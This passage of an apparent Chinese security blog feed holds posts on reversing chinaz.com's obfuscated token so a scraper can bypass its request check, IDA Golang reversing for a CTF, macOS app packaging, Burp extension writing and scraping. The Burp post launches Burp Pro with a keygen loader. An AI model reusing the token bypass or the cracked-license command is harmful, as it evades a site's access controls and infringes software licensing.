title="案例：chinaz.com"></a>案例：chinaz.com</h2><p>背景：</p><p>在某天wego使用chinaz.com查询icp数据没有数据，用burp抓包分析，发现在请求时返回口令不正确稍后再试</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 8.png)</p><p>访问网站重新抓包发现请求数据包中存在token字段</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 9.png)</p><p>使用debug，分析token的生成</p><p>在XHR中设置断点，设置网址包含 <code>/Home/PageData</code> <code>/Home/QiYeData</code></p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 10.png)</p><p>点击查询按钮</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 11.png)</p><p>浏览器在此处停止</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 12.png)</p><p>连续跳出当前函数，发现post数据包</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 13.png)</p><p>进一步发先token所在位置</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 14.png)</p><p>找到token生成的函数为<code>generateWordKey</code> ，参数为公司名称</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 15.png)</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 16.png)</p><p>在generatetoken.js下断点进行观察</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 17.png)</p><p>从变量中也验证了token的生成算法是根据一个随机数和公司名称生成的</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 18.png)</p><p>在控制台中使用<code>generateWordKey</code>函数生成token</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 19.png)</p><p>发包进行测试，可以获取数据</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 20.png)</p><p>做到这里其实并不需要，完全把token的生成算法全部逆向出来，知道大概的流程就可以。</p><p>可以通过<code>generatetoken.js</code> 去生成token，在wego中使用execjs库去执行js代码生成token</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def</span><br><span class="line"><span class="title function_">getToken</span>(self)</span><br><span class="line">:</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;../../../utils/data/generatetoken.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span></span><br><span class="line"><span class="attr">f</span>:</span><br><span class="line">    js = f.<span class="title function_">read</span>()</span><br><span class="line">ctx = <span class="title function_">compile</span>(js)</span><br><span class="line">token = ctx.<span class="title function_">call</span>(<span class="string">&#x27;generateWordKey&#x27;</span>, self.<span class="property">kw</span>)</span><br><span class="line"><span class="keyword">return</span> token</span><br></pre></td></tr></table></figure><p>成功解决bug获取到icp数据，好耶</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 21.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var _0x1b9ebc = new Pages(_0x25521d[&#x27;gQcZW&#x27;]);</span><br><span class="line">    var _0xe89c07 = generateWordKey(pageKw);</span><br><span class="line">    var _0x410bc0 = generateHostMD5Key(_0xe89c07, enkey);</span><br><span class="line">    var _0x73188a = getRandomNum(_0xe89c07);</span><br><span class="line">    $[&#x27;ajax&#x27;](&#123;</span><br><span class="line">        &#x27;type&#x27;: _0x25521d[_0x34da(&#x27;‫9b&#x27;, &#x27;wjKk&#x27;)],</span><br><span class="line">        &#x27;url&#x27;: _0x25521d[_0x34da(&#x27;‫9c&#x27;, &#x27;K)OH&#x27;)],</span><br><span class="line">        &#x27;beforeSend&#x27;: function() &#123;</span><br><span class="line">            _0x25521d[_0x34da(&#x27;‫9d&#x27;, &#x27;Ioe9&#x27;)]($, &#x27;#result_table&#x27;)[_0x34da(&#x27;‮9e&#x27;, &#x27;wjKk&#x27;)](_0x25521d[_0x34da(&#x27;‫9f&#x27;, &#x27;kjeK&#x27;)]);</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;data&#x27;: &#123;</span><br><span class="line">            &#x27;pageNo&#x27;: currPage,</span><br><span class="line">            &#x27;pageSize&#x27;: pageSize,</span><br><span class="line">            &#x27;Kw&#x27;: pageKw,</span><br><span class="line">            &#x27;enKey&#x27;: enkey,</span><br><span class="line">            &#x27;randomNum&#x27;: _0x73188a,</span><br><span class="line">            &#x27;token&#x27;: _0x410bc0</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang逆向</title>
      <link href="/2022/08/12/Golang%E9%80%86%E5%90%91/"/>
      <url>/2022/08/12/Golang%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA-golang解析相关项目"><a href="#IDA-golang解析相关项目" class="headerlink" title="IDA golang解析相关项目"></a>IDA golang解析相关项目</h2><p><a href="https://github.com/0xjiayu/go_parser">https://github.com/0xjiayu/go_parser</a></p><p><a href="https://github.com/sibears/IDAGolangHelper">https://github.com/sibears/IDAGolangHelper</a></p><p><a href="https://github.com/SentineLabs/AlphaGolang">https://github.com/SentineLabs/AlphaGolang</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在测试的时候，在ida7.5环境中只成功运行了IDAGolangHelper</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled.png" alt="Untitled"></p><p>选择下载的解析脚本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%201.png" alt="Untitled"></p><p>按需选择相应的功能</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%202.png" alt="Untitled"></p><p>点击<code>try to datemine go version based on moduledata</code></p><p>判断module的版本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%203.png" alt="Untitled"></p><p>点击 <code>try to datemine go version based on version string</code></p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%204.png" alt="Untitled"></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="扫描器样本"><a href="#扫描器样本" class="headerlink" title="扫描器样本"></a>扫描器样本</h3><p>蓝队捕获的一个扫描器样本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%205.png" alt="Untitled"></p><h3 id="inctf-ultimateGo"><a href="#inctf-ultimateGo" class="headerlink" title="inctf ultimateGo"></a>inctf ultimateGo</h3><h2 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h2><p>尝试运行程序：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%206.png" alt="Untitled"></p><p>输入正确的字符就会输出flag，基本思路就是在程序中找到判断位置，然后静态分析或动态分析出这个这个正确的字符串。</p><p>在测试的时候，在ida7.5环境中只成功运行了IDAGolangHelper</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled.png" alt="Untitled"></p><p>选择下载的解析脚本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%201.png" alt="Untitled"></p><p>按需选择相应的功能</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%202.png" alt="Untitled"></p><p>点击<code>try to datemine go version based on moduledata</code></p><p>判断module的版本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%207.png" alt="Untitled"></p><p>点击 <code>try to datemine go version based on version string</code></p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%208.png" alt="Untitled"></p><p>点击 <code>Rename functions</code> 尝试还原函数名</p><p>在还原函数名时总是报错：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%209.png" alt="Untitled"></p><p>通过查看issues发现解决方法：</p><p><a href="https://github.com/sibears/IDAGolangHelper/issues/20">https://github.com/sibears/IDAGolangHelper/issues/20</a></p><p>其中报错信息提示name的数据类型不对，把name decode下解决报错问题。</p><p>重复上述过程，点击<code>OK</code>后就可以使用F5大法查看逆向出来的代码了</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2010.png" alt="Untitled"></p><p>我们通常从main函数下手</p><p>输出提示信息：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2011.png" alt="Untitled"></p><p>输入字符串：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2012.png" alt="Untitled"></p><p>下面是一个if判断，</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2013.png" alt="Untitled"></p><p>首先去判断字符串长度是否为21，然后还有判断<code>&#123;&#125;</code> 这两个字符，我们可以知道输入的其实就是flag</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2014.png" alt="Untitled"></p><p>进入循环，通过把输入的字符串逐字符进行加密操作后和程序中存储的字符进行对比。</p><p>ps：其中分析的时候有主观猜测，比如<code>v24[1] == 24</code> 为什么下标为1的表示这个字符串的大小呢</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac app打包</title>
      <link href="/2022/06/13/mac%20app%E6%89%93%E5%8C%85/"/>
      <url>/2022/06/13/mac%20app%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="为APP制作图标"><a href="#为APP制作图标" class="headerlink" title="为APP制作图标"></a>为APP制作图标</h2><p>创建<code>icons.iconset</code>文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir icons.iconset</span><br></pre></td></tr></table></figure><p>生成图片集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sips -z <span class="number">16</span> <span class="number">16</span> ali.png --out icons.iconset/icon_16x16.png</span><br><span class="line">sips -z <span class="number">32</span> <span class="number">32</span> ali.png --out icons.iconset/icon_16x16@2x.png</span><br><span class="line">sips -z <span class="number">32</span> <span class="number">32</span> ali.png --out icons.iconset/icon_32x32.png</span><br><span class="line">sips -z <span class="number">64</span> <span class="number">64</span> ali.png --out icons.iconset/icon_32x32@2x.png</span><br><span class="line">sips -z <span class="number">128</span> <span class="number">128</span> ali.png --out icons.iconset/icon_128x128.png</span><br><span class="line">sips -z <span class="number">256</span> <span class="number">256</span> ali.png --out icons.iconset/icon_128x128@2x.png</span><br><span class="line">sips -z <span class="number">256</span> <span class="number">256</span> ali.png --out icons.iconset/icon_256x256.png</span><br><span class="line">sips -z <span class="number">512</span> <span class="number">512</span> ali.png --out icons.iconset/icon_256x256@2x.png</span><br><span class="line">sips -z <span class="number">512</span> <span class="number">512</span> ali.png --out icons.iconset/icon_512x512.png</span><br><span class="line">sips -z <span class="number">1024</span> <span class="number">1024</span> ali.png --out icons.iconset/icon_512x512@2x.png</span><br></pre></td></tr></table></figure><p>转化成<code>icon.icns</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconutil -c icns -o icon.icns icons.iconset</span><br></pre></td></tr></table></figure><h2 id="制作-app-bundle"><a href="#制作-app-bundle" class="headerlink" title="制作 .app bundle"></a>制作 .app bundle</h2><p>mac上运行的程序其实上一个.app的文件夹，其中包含了二进制文件和清单文件。</p><p>目录结构如下；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree my.app</span><br><span class="line">my.app/</span><br><span class="line">└── Contents</span><br><span class="line">    ├── Info.plist</span><br><span class="line">    ├── MacOS</span><br><span class="line">    │   └── my</span><br><span class="line">    └── Resources</span><br><span class="line">        └── icon.icns</span><br><span class="line">3 directories, 3 files</span><br></pre></td></tr></table></figure><p>其中有三个关键的文件：</p><ul><li>Info.plist:清单文件</li><li>my: 你要打包的二进制文件</li><li>icon.icns: 打包好的不同尺寸的图标文件</li></ul><h3 id="添加Info-plist"><a href="#添加Info-plist" class="headerlink" title="添加Info.plist"></a>添加Info.plist</h3><p>文件示例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleExecutable<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>my<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIconFile<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>icon.icns<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIdentifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.yours<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>NSHighResolutionCapable<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>LSUIElement<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中你需要更改的地方为<code>CFBundleExecutabl</code>、<code>CFBundleIdentifier</code></p><p>ps：<code>LSUIElement</code> 告诉macos这个程序是一个代理程序，以至于它不会出现在任务栏中。起到了一定的隐藏效果。。</p><p>现在你就得到了一个可以双击打开的app了</p><h2 id="制作DMG文件"><a href="#制作DMG文件" class="headerlink" title="制作DMG文件"></a>制作DMG文件</h2><p>制作一个磁盘文件，其中放置了你的app，这样可以轻易的拖拽到应用文件夹并且安装。</p><h3 id="制作-DMB-模板"><a href="#制作-DMB-模板" class="headerlink" title="制作 DMB 模板"></a><strong>制作 DMB 模板</strong></h3><p>打开磁盘工具。按 ⌘N 创建一个新的磁盘镜像。给它取个名字，配置好足以容纳你的程序包的空间大小。</p><p><img src="/../imgs/mac%20app%E6%89%93%E5%8C%85%204d57e10a603b4660b158fd15ef526815/Untitled.png" alt="Untitled"></p><p>在访达中找到挂载的镜像。定制此文件夹的试图设置，使它成为用户实际安装史看到的样子。通常我们可以设置一个背景图片、隐藏工具栏和边栏、增加图标尺寸。</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 1.png)</p><p>配置如下：</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 2.png)</p><h3 id="转换-DMG-文件以便于分发"><a href="#转换-DMG-文件以便于分发" class="headerlink" title="转换 DMG 文件以便于分发"></a><strong>转换 DMG 文件以便于分发</strong></h3><p>把磁盘文件进行压缩，进行转换</p><p>打开磁盘工具，选择镜像-&gt;转换。给文件起一个有意义的名称，其他设置保持不变。（镜像格式应为“压缩”）</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 3.png)</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 4.png)</p><p>这样我们的磁盘安装包就弄好啦</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 5.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brup插件编写</title>
      <link href="/2022/04/30/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2022/04/30/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="编写插件基础步骤"><a href="#编写插件基础步骤" class="headerlink" title="编写插件基础步骤"></a>编写插件基础步骤</h1><ol><li><p>首先你得有一个IDE：<a href="https://www.jetbrains.com/idea/">IntelliJ IDEA</a>,<a href="https://netbeans.org/">Netbeans</a>,<br>and<a href="https://www.eclipse.org/">Eclipse</a></p></li><li><p>新建一个项目，并且新建一个命名为burp的package</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled.png" alt="Untitled"></p><p>![Untitled](..&#x2F;imgs&#x2F;Brup插件编写%203ad132a22e8f46f7b215806633aa7956&#x2F;Untitled 1.png)</p></li><li><p>从burp中下载接口文件</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%202.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%203.png" alt="Untitled"></p></li><li><p>在burp包中，把接口文件复制到burp包中，并新建<code>BurpExtender.java</code></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%204.png" alt="Untitled"></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BurpExtender</span> <span class="keyword">implements</span> <span class="title class_">IBurpExtender</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// implement IBurpExtender</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// set our extension name</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// obtain our output and error streams</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stdout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStdout(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stderr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStderr(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        stdout.println(<span class="string">&quot;Hello output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        stderr.println(<span class="string">&quot;Hello errors&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        callbacks.issueAlert(<span class="string">&quot;Hello alerts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exceptions&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译生成jar包</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%205.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%206.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%207.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%208.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%209.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2010.png" alt="Untitled"></p><p>编译成功</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2011.png" alt="Untitled"></p></li><li><p>加载插件</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2012.png" alt="Untitled"></p><p>加载成功</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2013.png" alt="Untitled"><br><img src="/../imgs/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2013.png" alt="Untitled 13.png"></p></li><li><p>远程调试<br>idea设置remote jvm debug</p><p>![Untitled](..&#x2F;imgs&#x2F;Brup插件编写%203ad132a22e8f46f7b215806633aa7956&#x2F;Untitled 14.png)</p><p>burp启动命令，java版本需要在java9以上</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/<span class="title class_">Cellar</span>/openjdk@<span class="number">11</span>/<span class="number">11.0</span><span class="number">.15</span>/libexec/openjdk.<span class="property">jdk</span>/<span class="title class_">Contents</span>/<span class="title class_">Home</span>/bin/java -<span class="attr">agentlib</span>:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="number">5005</span> -<span class="attr">javaagent</span>:<span class="title class_">BurpLoaderKeygen</span>.<span class="property">jar</span> -noverify -jar burpsuite_pro.<span class="property">jar</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫相关</title>
      <link href="/2022/03/29/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3/"/>
      <url>/2022/03/29/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="编写第一个selenium脚本"><a href="#编写第一个selenium脚本" class="headerlink" title="编写第一个selenium脚本"></a>编写第一个selenium脚本</h2><ol><li>建立一个浏览器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br></pre></td></tr></table></figure><h2 id="Chrome-XPath-使用"><a href="#Chrome-XPath-使用" class="headerlink" title="Chrome XPath 使用"></a>Chrome XPath 使用</h2><ol><li>qcc域名</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x(<span class="string">&#x27;//div[@class=&quot;contact-info&quot;]/div[2]/span/span/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n                      https://www.qingteng.cn/\n</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3%2071c1ac3a2d084ab78b42f4117352a822/Untitled.png" alt="Untitled"></p><p>字段中存在<code>\n “ ”</code>多余的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">26</span>]: s</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">&#x27;\n                      www.people.cn\n                    &#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: s.strip()</span><br><span class="line">Out[<span class="number">27</span>]: <span class="string">&#x27;www.people.cn&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Pyppeteer使用"><a href="#Pyppeteer使用" class="headerlink" title="Pyppeteer使用"></a><a href="https://miyakogi.github.io/pyppeteer/index.html#">Pyppeteer</a>使用</h2><p>puppeteer JavaScript headless chrome&#x2F;chromium 浏览器自动化python实现的非官方接口</p><p>文档地址：</p><p><a href="https://miyakogi.github.io/pyppeteer/">Pyppeteer</a></p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>pyppeteer需要Python3.6+</p><p>通过pip安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 